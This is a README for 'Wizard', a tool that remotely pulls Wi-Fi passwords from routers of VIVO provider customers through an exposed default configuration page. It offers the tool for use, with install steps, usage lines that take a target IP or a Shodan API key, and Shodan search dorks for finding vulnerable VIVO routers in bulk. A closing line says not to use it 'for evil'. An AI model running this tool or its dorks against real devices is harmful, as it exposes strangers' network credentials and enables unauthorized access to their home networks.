# Wizard

Wizard is a tool to get the wireless password remotely from the VIVO provider's users..

This method accesses the default wireless configuration page and extracts the password, if and only if ports are open and the configuration page exists.

<a href="https://asciinema.org/a/L3AE0v2xH7B6p8bLc4iaf3HWV">
       <img src="http://i.imgur.com/bp34ge7.png">
</a>

### How to use?
To use shodanwave you need an api key which you can get for free at https://www.shodan.io/, then you need to follow the next steps.

### Installation

```
$ cd /opt/
$ git clone https://github.com/fbctf/wizard.git
$ cd wizard
$ pip install -r requirements.txt
```
### Usage
```
Usage: python wizard.py  --target 192.168.0.1 --port 80
       python wizard.py  --search '/wizard' -k API key
       python wizard.py --help 
```
## Dork
```
org:"Vivo" /wizard
org:"Vivo" /wizard OR rg_cookie_session_id=
```
### Attention
Use this tool wisely and not for evil. To get the best performece of this tool you need to pay for shodan to get full API access
Options --limit and --offset may need a paying API key and consume query credits from your Shodan account.

### References:

 * [Shodan API](https://www.shodan.io/)  search engine for Internet-connected devices.
 * [Requests](http://docs.python-requests.org/en/master/) Requests: HTTP for Humans
